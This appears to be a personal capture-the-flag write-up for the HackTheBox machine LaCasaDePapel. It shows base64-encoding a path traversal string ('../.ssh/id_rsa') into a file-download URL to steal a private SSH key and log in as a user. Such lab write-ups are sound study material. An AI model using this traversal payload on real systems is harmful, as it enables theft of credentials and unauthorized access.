# SSH Key

Can notice the files is base64 encoded 
![[Pasted image 20211201073442.png]]

```bash
$ echo U0VBU09OLTEvMDEuYXZp | base64 -d
```
![[Pasted image 20211201073531.png]]

Lets base64 the path for the file id_rsa on folder .ssh
```bash
$ echo -n ../.ssh/id_rsa | base64
Li4vLnNzaC9pZF9yc2E=
```

And place in url  as
```bash
https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=
```

![[Pasted image 20211201073921.png]]

* Trying ssh with some of this users
![[Pasted image 20211201074340.png]]

Logon as Professor 
![[Pasted image 20211201074454.png]]